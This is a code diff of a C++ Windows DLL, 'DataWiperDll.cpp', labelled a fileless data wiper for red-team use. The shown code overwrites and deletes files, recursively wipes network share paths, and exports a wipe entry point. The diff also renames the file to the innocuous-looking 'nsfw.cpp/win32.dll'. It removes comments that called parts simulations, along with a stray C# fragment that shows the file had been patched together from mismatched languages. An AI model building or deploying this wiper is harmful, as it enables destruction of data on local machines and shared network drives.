@@ -1,5 +1,5 @@
-// DataWiperDll.cpp (Fileless Version)
-// Memory-resident secure file/data wiper with local + network support (red team use only)
+// DataWiperDll.cpp/nsfw.cpp/win32.dll (Fileless Version)
+// Memory-resident secure file/data wiper with local + network support (Red Team use only)
 
 #include <windows.h>
 #include <shlwapi.h>
@@ -29,7 +29,7 @@ bool SecureWipeFile(const std::wstring& filePath, int passes) {
     }
 
     std::unique_ptr<BYTE[]> buffer(new BYTE[(size_t)fileSize.QuadPart]);
-    DWORD written;
+    DWORD written = 0;
 
     for (int p = 0; p < passes; ++p) {
         for (LONGLONG i = 0; i < fileSize.QuadPart; ++i)
@@ -41,7 +41,6 @@ bool SecureWipeFile(const std::wstring& filePath, int passes) {
     }
 
     CloseHandle(hFile);
-    // Remove file directly via API
     return DeleteFileW(filePath.c_str());
 }
 
@@ -60,13 +59,12 @@ bool IsNetworkPath(const std::wstring& path) {
     return PathIsNetworkPathW(path.c_str());
 }
 
-// --- In-Memory Logging Simulation (Fileless) --- //
+// --- In-Memory Logging Stub --- //
 void SimulateLogEvent(const std::wstring& filePath) {
-    // Stub: send to memory, socket, or ignored entirely
     OutputDebugStringW((L"[WIPED] " + filePath + L"\n").c_str());
 }
 
-// --- Fallback In-Memory Overwrite --- //
+// --- Memory Overwrite Fallback (Non-persistent) --- //
 bool TryMemoryOverwriteFallback(const std::wstring& filePath, int passes) {
     HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
         NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -84,11 +82,10 @@ bool TryMemoryOverwriteFallback(const std::wstring& filePath, int passes) {
         for (LONGLONG j = 0; j < fileSize.QuadPart; ++j)
             dummy[j] = rand() % 256;
 
-    // Simulation only – not persisted.
-    return true;
+    return true; // Simulated overwrite
 }
 
-// --- Extended Wipe (In-Memory Logging) --- //
+// --- Extended Wipe (Logs + Fallback) --- //
 bool SecureWipeFileExtended(const std::wstring& filePath, int passes) {
     if (SecureWipeFile(filePath, passes)) {
         SimulateLogEvent(filePath);
@@ -99,7 +96,7 @@ bool SecureWipeFileExtended(const std::wstring& filePath, int passes) {
     }
 }
 
-// --- Network Recursive Wipe --- //
+// --- Recursive Wipe for Network Paths --- //
 void WipeNetworkPath(const std::wstring& networkPath, int passes) {
     for (const auto& entry : std::filesystem::recursive_directory_iterator(
         networkPath, std::filesystem::directory_options::skip_permission_denied)) {
@@ -143,12 +140,6 @@ extern "C" __declspec(dllexport) BOOL WipeDataExtended(const wchar_t* targetPath
 
     return TRUE;
 }
-
-public class DataWiper {
-    public static bool WipeData(string targetPath, int passes) { ... }
-}
-
-
 
 // --- DLL Entry Point --- //
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
